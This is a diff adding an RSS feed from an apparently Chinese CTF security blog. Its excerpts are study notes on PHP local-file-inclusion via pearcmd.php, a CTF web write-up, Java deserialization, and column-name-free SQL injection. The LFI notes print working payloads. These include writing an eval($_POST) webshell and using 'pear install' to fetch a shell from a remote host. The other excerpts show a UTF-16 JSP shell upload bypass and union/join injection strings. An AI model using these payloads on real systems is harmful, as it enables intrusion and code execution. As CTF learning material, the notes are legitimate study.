@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>web on k1te's blog</title><link>https://k1te.cn/tags/web/</link><description>Recent content in web on k1te's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 10 Jan 2022 10:10:38 +0800</lastBuildDate><atom:link href="https://k1te.cn/tags/web/index.xml" rel="self" type="application/rss+xml"/><item><title>LFI 新姿势学习</title><link>https://k1te.cn/2022/01/10/lfi%E5%AD%A6%E4%B9%A0/</link><pubDate>Mon, 10 Jan 2022 10:10:38 +0800</pubDate><guid>https://k1te.cn/2022/01/10/lfi%E5%AD%A6%E4%B9%A0/</guid><description>前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下
+pearcmd.php config-create 这个并不是上面说的新trick，而是p牛十一月份就发了的：Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)，当时十一月份湖湘杯我们还在辛苦地session文件包含，结束后发现大家都是用pearcmd.php，只能说多学习。具体原理参考上面p牛的文章，这里就单纯做个记录方便自己查阅
+这里使用的是2021湖湘杯easywill，如果仿照p牛的payload，那么最终的payload如下：
+1 ?+config-create+/&amp;amp;name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;/&amp;lt;?=phpinfo()?&amp;gt;+/tmp/hello.php (注意，请使用burp发包，否则尖括号会被url编码，此处只是演示)
+可以看到我们的name和value变量成功传入，同时$_SERVER['argv']也成功解析，需要注意的是config-create必须在$_SERVER['argv']数组的第二个位置，然后后面两个参数紧随其后，否则会报错，所以config-create前面还有一个+号，使得第0个元素为空，这个应该是php源码的处理，这里就没有再往下跟了。
+综上，我们还可以将payload改成：
+1 /?name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;+config-create+/&amp;lt;?=phpinfo()?&amp;gt;+/tmp/hello.php 可以实现同样的效果
+install 在学习p牛文章的过程中找到了bfengj师傅的一篇文章：利用pearcmd.php从LFI到getshell，里面介绍了pear的另一个利用方法：
+1 pear install -R /tmp http://xxxxxxx/shell.php 这个方法可以直接把我们的webshell下载到靶机从而实现RCE
+回到我们easywill的环境，payload：
+1 url?name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;+install+-R+/tmp+http://ip:port/info.php 同时，在这片文章中还学到了config-create的另一个用法：
+我们可以使用pear -c file -d foo=bar -s达到同样的写配置文件的目的，在easywill中的payload如下：
+1 /?name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;+-c+/tmp/shell.php+-d+man_dir=&amp;lt;?eval($_POST[0]);?&amp;gt;+-s+ 最后一个+号好像没有也可以。
+限制 今天早上写的时候刚好在p牛的星球看到Smity师傅发的文章，大概意思是php官方的镜像确实如p牛所说，但是如果是使用apt install php下载的php（据该师傅所言，大多数ctf docker的制作方式都是这个），那么这个环境就和P牛所说的环境有两个不同：
+pearcmd.php在/usr/share/php/pearcmd.php register_argc_argv在php.ini中默认关闭 如果说第一个还可以调整，那么第二个限制则是致命的。
+可能是我的运气比较好，也可能是我比较懒，easywill的环境我刚好是根据php官方镜像搭建的，所以没踩到这个坑。
+利用 Nginx 产生临时文件 这个技巧来源于hxp2021，不过我并没有打这个比赛，而是如开头所说通过p牛的星球了解到的，看了Zeddy大佬的文章只能说叹为观止。
+总结起来整个过程就是：</description></item><item><title>2021美团网络安全高校挑战赛web部分wp</title><link>https://k1te.cn/2021/12/13/2021mtctf/</link><pubDate>Mon, 13 Dec 2021 15:51:24 +0800</pubDate><guid>https://k1te.cn/2021/12/13/2021mtctf/</guid><description>跟着队友学到了不少东西
+HackMe 随便上传一个东西显示“HACK! I filtered all the characters.”，尝试上传一个a，发现可以，上传aa不行，上传a a可以，猜测是字符不能连在一起，可以用utf-16绕过，随便拿个jsp马转成utf-16即可：
+然后上传成功之后会显示一个地址upload/1b5337d0c8ad813197b506146d8d503d/yyyyMMddhhmmssSSS.jsp，后面hint出来才知道这个yyyyMMddhhmmssSSS是上传时的时间戳，最后的SSS是毫秒，我们可以简单写个脚本来爆：
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from os import name import requests import time import sys import threading def func(fname): res = requests.get(fname) if &amp;#34;Something went wrong&amp;#34; not in res.text: print(fname) sys.</description></item><item><title>Java反序列化基础</title><link>https://k1te.cn/2021/12/12/java%E5%9F%BA%E7%A1%80/</link><pubDate>Sun, 12 Dec 2021 15:53:17 +0800</pubDate><guid>https://k1te.cn/2021/12/12/java%E5%9F%BA%E7%A1%80/</guid><description>Java入门的简单基础，包括序列化反序列化、反射、类的动态加载，动态代理暂时还没用到，后面用到再加上。
+序列化和反序列化 Java序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。
+用处 想把内存中的对象保存到一个文件中或者数据库中时候； 想用套接字在网络上传送对象的时候； 想通过RMI传输对象的时候 实现 只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）
+通过 ObjectOutStream 包装 FileOutStream或者ByteArrayInputStream
+同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream 读取出来然后转化为指定的对象
+ObjectOutputStream代表对象输出流：
+它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 ObjectInputStream代表对象输入流：
+它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 例子 Person.java
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class Person implements Serializable { private String name; private int age; public Person(){} public Person(String name, int age) { this.</description></item><item><title>ctf无列名注入小结</title><link>https://k1te.cn/2021/05/19/no-column-sql-injection/</link><pubDate>Wed, 19 May 2021 22:10:17 +0800</pubDate><guid>https://k1te.cn/2021/05/19/no-column-sql-injection/</guid><description>ctf无列名注入小结 其实之前也遇到过类似的题目，但是拖延症太严重了，一直没有仔细研究，正好这次国赛初赛也有一道无列名注入的题目，好好学习一下。
+无列名注入一般伴随着bypass information_schema，当这个表被过滤的时候，我们只能使用sys.schema_auto_increment_columns、sys.schema_table_statistics_with_buffer、mysql.innodb_table_stats等等进行绕过，但是这些表中一般都没有字段名，只能获得表名，所以当我们知道表明之后，还需要进一步地使用无列名注入
+一、列名重复（join……using） 条件：需要开启报错
+直接拿sqli-labs的email表来做演示（后面也会使用这个表）：
+假设我们已经bypass了information_schema并且获得了emails这个表名，这时候我们可以使用?id=1' union select * from (select * from emails a join emails b)c--+dump出第一个字段名：
+紧接着使用?id=1' union select * from (select * from emails a join emails b using(id))c--+dump出第二个字段名：
+一般网上的文章到这里就结束了，但是搞不明白原理是啥（可能是因为我太菜了），所以自己又接着往下研究。
+当我们继续使用?id=1' union select * from (select * from emails a join emails b using(id,email_id))c--+，会报列数不一致的错误：
+因为这个时候已经select成功了，但是只有两列，而union前面的语句有三列，所以列数不一致，在命令行里是可以成功select的：
+或者这样：
+所以join……using到底是啥呢，我又去Google了一下：SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。
+join有不同的类型：
+INNER JOIN：如果表中有至少一个匹配，则返回行 LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 FULL JOIN：只要其中一个表中存在匹配，则返回行 其中inner join 和 join是相同的
+security中还有一个users表如下：</description></item></channel></rss>
